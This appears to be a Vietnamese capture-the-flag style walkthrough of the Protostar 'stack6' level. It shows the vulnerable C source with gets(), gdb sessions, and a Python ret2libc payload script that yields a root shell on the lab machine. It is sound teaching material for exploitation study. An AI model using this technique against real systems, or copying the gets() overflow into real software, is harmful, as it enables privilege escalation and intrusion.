# STACK SIX

## About

Stack6 looks at what happens when you have restrictions on the return address.

This level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming.

It is strongly suggested you experiment with multiple ways of getting your code to execute here.

This level is at /opt/protostar/bin/stack6

## Source code

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

## Solutions

`STACK SIX` muốn chúng ta xem xét về cách vượt qua giới hạn khi mà địa chỉ trả về bị giới hạn. Cụ thể hơn là cách khai thác ret2libc.

Đoạn code sau:

```
  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }
```

if((ret & 0xbf000000) == 0xbf000000)

```
Giả sử ret = 0xbf777777
	     ret & 0xbf000000

	     0xbf777777 
           & 0xbf000000
	     __________
             0xbf000000 <-- luôn bằng 0xbf000000
```

Đoạn code này có khả năng chặn mọi địa chỉ trả về mà ta cố ghi đè vào EIP (tất cả bị đưa về `0xbf000000`) nếu như địa chỉ đó nằm trong khoảng từ `0xbf000000` đến `0xbfffffff`.

```
root@protostar:/opt/protostar/bin# gdb -q ./stack6
Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) start
Temporary breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
Starting program: /opt/protostar/bin/stack6

Temporary breakpoint 1, main (argc=1, argv=0xbffffd54) at stack6/stack6.c:27
27      stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
(gdb) info proc map
process 1984
cmdline = '/opt/protostar/bin/stack6'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
        0xb7e96000 0xb7e97000     0x1000          0
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0
        0xb7fe0000 0xb7fe2000     0x2000          0
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb)
```

Đoan địa chỉ từ `0xbf000000` đến `0xbfffffff` là stack -> không thể ghi đè shellcode lên stack rồi return lại để thực thi shellcode như `STACK FIVE`.

Thử thách này để có thể thực thi được shell ta sẽ sử dụng phương pháp ret2libc.
Đầu tiên là tìm lượng padding cần thiết để flow được vào EIP.

```
(gdb) c
Continuing.
input path please: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()       <-- 'TTTT'    76 ký tự
(gdb)
```

Sau đó là tìm địa chỉ của system() và exit() và địa chỉ của chuỗi `/bin/sh`:

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
(gdb) find 0xb7e97000, 0xb7fd9000, "/bin/sh"
0xb7fba23f
1 pattern found.
(gdb) x/s 0xb7fba23f
0xb7fba23f:      "KIND in __gen_tempname\""
(gdb)
```

Địa chỉ của chuỗi `/bin/sh` ta tìm được khi kiểm tra lại không chứa chuỗi ta cần tìm.

Vì vậy ta sẽ dùng cách khác để tìm `/bin/sh`:

```
root@protostar:/opt/protostar/bin# strings -tx /lib/libc-2.11.2.so | grep /bin/sh
 11f3bf /bin/sh             <-- offset của /bin/sh so với địa chỉ bắt đầu của libc
 
 Địa chỉ của '/bin/sh' = Địa chỉ bắt đầu libc + 0x11f3bf
 0xb7fb63bf = 0xb7e97000 + 0x11f3bf
```

Payload của chúng ta bây giờ là 

`payload = "A" * 76 + addr_system + addr_exit + addr_shellcode`

File exp.py

```
import struct
pd = "A" * 76
sysadd = struct.pack("I", 0xb7ecffb0)
exitadd = struct.pack("I", 0xb7ec60c0)
binadd = struct.pack("I", 0xb7fb63bf)
payload = pd + sysadd + exitadd + binadd
print payload
```

Done!

```
root@protostar:/opt/protostar/bin$ (python exp.py; cat) | ./stack6
input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP���RRRRSSSSTTTT����`췿c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
ls
final0	format0  format3  heap1  net0  net3    stack1  stack4  stack7
final1	format1  format4  heap2  net1  net4    stack2  stack5
final2	format2  heap0	  heap3  net2  stack0  stack3  stack6
```

## Documents

<https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/>

<https://www.coengoedegebure.com/buffer-overflow-attacks-explained/>

<https://en.wikipedia.org/wiki/Endianness>


